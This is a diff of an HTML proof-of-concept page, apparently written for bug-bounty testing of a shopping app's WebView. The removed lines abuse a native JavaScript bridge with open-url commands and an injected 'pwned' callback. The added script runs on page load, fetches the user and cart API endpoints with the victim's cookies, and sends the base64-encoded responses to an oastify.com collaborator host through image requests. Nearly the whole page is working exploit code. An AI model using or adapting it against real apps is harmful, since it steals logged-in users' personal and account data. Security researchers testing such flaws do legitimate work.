@@ -1,53 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JS Bridge Exploit</title>
+    <title>WebView PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
-<h1>JS Bridge Test</h1>
-
-<button onclick="test1()">open-native-url</button>
-<button onclick="test2()">open-url</button>
-<button onclick="test3()">callback injection</button>
+<h2>SINARPAGI PoC</h2>
 
 <script>
-function send(data) {
-    try {
-        AndroidMessageHandler.postMessage(JSON.stringify(data));
-    } catch (e) {
-        fetch("https://b7jdqfyehjfetsfo712ctcqjxa32rtfi.oastify.com/?error=" + e);
+(function() {
+    const COLLAB = "https://l5rnopwoftdor2dy5b0mrmotvk1fp7dw.oastify.com";
+
+    function log(msg) {
+        new Image().src = COLLAB + "/?log=" + encodeURIComponent(msg);
     }
-}
 
-// TEST 1
-function test1() {
-    send({
-        command: "open-native-url",
-        url: "kolonialno://profile"
-    });
-}
+    function exfil(data) {
+        new Image().src = COLLAB + "/?data=" + btoa(data);
+    }
 
-// TEST 2
-function test2() {
-    send({
-        command: "open-url",
-        url: "https://oda.com/no/cart/"
-    });
-}
+    try {
+        log("POC_LOADED");
 
-// TEST 3 (IMPORTANT)
-function test3() {
-    send({
-        command: "open-url",
-        url: "https://oda.com/no-en/account/climate/",
-        callbackString: "alert('pwned')"
-    });
-}
+        // Step 1: cek apakah ini dalam WebView
+        if (navigator.userAgent.includes("wv")) {
+            log("WEBVIEW_DETECTED");
+        } else {
+            log("NOT_WEBVIEW");
+        }
 
-// auto trigger
-setTimeout(() => {
-    fetch("https://b7jdqfyehjfetsfo712ctcqjxa32rtfi.oastify.com/?loaded=1");
-}, 1000);
+        // Step 2: ambil data user
+        fetch("/api/v1/user/refresh/", {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(res => res.text())
+        .then(data => {
+            log("API_RESPONSE_RECEIVED");
+            exfil(data);
+        })
+        .catch(err => {
+            log("FETCH_ERROR:" + err);
+        });
+
+        // Step 3: fallback (kadang endpoint beda)
+        fetch("/api/v1/cart/", {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(res => res.text())
+        .then(data => {
+            log("FALLBACK_API_SUCCESS");
+            exfil(data);
+        })
+        .catch(err => {
+            log("FALLBACK_ERROR:" + err);
+        });
+
+    } catch(e) {
+        log("EXCEPTION:" + e);
+    }
+})();
 </script>
+
 </body>
 </html>
